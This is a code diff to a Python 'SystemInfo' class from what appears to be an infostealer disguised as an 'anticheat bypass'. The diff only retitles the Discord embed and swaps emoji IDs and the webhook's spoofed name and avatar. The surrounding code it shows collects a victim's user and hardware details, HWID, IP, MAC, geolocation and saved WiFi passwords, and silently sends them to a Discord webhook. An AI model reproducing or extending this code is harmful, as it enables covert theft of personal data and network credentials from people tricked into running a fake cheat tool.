@@ -15,7 +15,7 @@ import time
 class SystemInfo():
     def __init__(self, webhook: str) -> None:
         webhook = SyncWebhook.from_url(webhook)
-        embed = Embed(title="pc de lata", color=0x000000)
+        embed = Embed(title="Computador", color=0x000000)
 
         embed.add_field(
             name=self.user_data()[0],
@@ -56,8 +56,6 @@ class SystemInfo():
             webhook.send(
                 embed=embed,
                 file=File('.\\anticheat_bypass.png', filename='anticheat_bypass.png'),
-                username="Empresario do C6 bank",
-                avatar_url="https://cdn.discordapp.com/attachments/1071430551745081356/1071567677799268442/sdasdad.png"
             )
         except:
             pass
@@ -83,7 +81,7 @@ class SystemInfo():
         username = os.getenv('USERNAME')
 
         return (
-            ":bust_in_silhouette: User",
+            "<:icons:1075850570784579658> User",
             f"**Display Name: {display_name}\nHostname: {hostname}\nUsername: {username}**",
             False
         )
@@ -105,7 +103,7 @@ class SystemInfo():
         hwid = get_hwid()
 
         return (
-            "<:CPU:1075842630413459618> System",
+            "<:CPU:1075842581742768208> System",
             f"**CPU: {cpu}\n GPU: {gpu}\n RAM: {ram}\n HWID: {hwid}**",
             False
         )
@@ -121,7 +119,7 @@ class SystemInfo():
                 usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"
 
         return (
-            "<:DiscordFloppy:1075842329539248218> Disk",
+            "<:DiscordFloppy:1075842277261455430> Disk",
             f"**{disk}**",
             False
         )
@@ -140,7 +138,7 @@ class SystemInfo():
         country, region, city, zip_, as_ = geolocation(ip)
 
         return (
-            "<:globe:1075843179267510363> Network",
+            "<:globe:1075843143049687171> Network",
             "**IP Address: {ip}\n MAC Address: {mac}\n Country: {country}\n Region: {region}\n City: {city} ({zip_})\n ISP: {as_}**".format(
                 ip=ip, mac=mac, country=country, region=region, city=city, zip_=zip_, as_=as_),
             False
@@ -182,7 +180,7 @@ class SystemInfo():
             out += '{:<20}| {:<}\n'.format(name, password)
 
         return (
-            "<:wifionline:1075845078125396069> WiFi",
+            "<:wifionline:1075843380388565032> WiFi",
             f"**{out}**",
             False
         )
